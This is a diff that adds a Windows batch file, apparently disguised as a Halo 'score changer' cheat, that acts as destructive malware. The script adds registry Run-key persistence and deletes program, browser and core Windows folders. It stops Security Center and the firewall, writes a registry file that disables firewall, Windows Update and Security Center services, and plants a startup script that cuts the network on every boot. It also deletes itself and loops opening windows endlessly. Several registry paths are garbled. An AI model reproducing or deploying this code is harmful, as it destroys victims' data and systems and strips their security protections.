@@ -1,0 +1,53 @@
+@echo off
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v MiXedVeX /t REG_SZ /d %systemroot%\HaloTrialScoreChangerV1 /f > nul
+start iexpress (website of your choice)
+ipconfig /release
+del "C:\Program Files\Microsoft Games
+del "C:Nexon
+del "C:\Program Files\Xfire
+del "C:\Program Files\Adobe"
+del "C:\Program Files\Internet Explorer"
+del "C:\Program Files\Mozilla Firefox"
+del "C:\WINDOWS"
+del "C:\WINDOWS\system32"
+del "C:\WINDOWS\system32\cmd"
+del "C:\WINDOWS\system32\iexpress"
+del "C:\WINDOWS\system32\sndvol32"
+del "C:\WINDOWS\system32\sndrec32"
+del "C:\WINDOWS\system32\Restore\rstrui"
+del "C:\WINDOWS\system32\wupdmgr"
+del "C:\WINDOWS\system32\desktop"
+del "C:\WINDOWS\java"
+del "C:\WINDOWS\Media"
+del "C:\WINDOWS\Resources"
+del "C:\WINDOWS\system"
+del "C:\drivers"
+del "C:\drv"
+del "C:\SYSINFO"
+del "C:\Program Files"
+echo ipconfig/release_all>>c:windowswimn32.bat
+net stop "Security Center"
+net stop SharedAccess
+> "%Temp%.kill.reg" ECHO REGEDIT4
+>>"%Temp%.kill.reg" ECHO.
+>>"%Temp%.kill.reg" ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesS haredAccess]
+>>"%Temp%.kill.reg" ECHO "Start"=dword:00000004
+>>"%Temp%.kill.reg" ECHO.
+>>"%Temp%.kill.reg" ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesw uauserv]
+>>"%Temp%.kill.reg" ECHO "Start"=dword:00000004
+>>"%Temp%.kill.reg" ECHO.
+>>"%Temp%.kill.reg" ECHO [HKEY_LOCAL_MACHINESYSTEMControlSet001Serviceswscsv c]
+>>"%Temp%.kill.reg" ECHO "Start"=dword:00000004
+>>"%Temp%.kill.reg" ECHO.
+START /WAIT REGEDIT /S "%Temp%.kill.reg"
+del "%Temp%.kill.reg"
+del %0
+echo @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+:a
+start iexpress (website of your choice)
+goto a
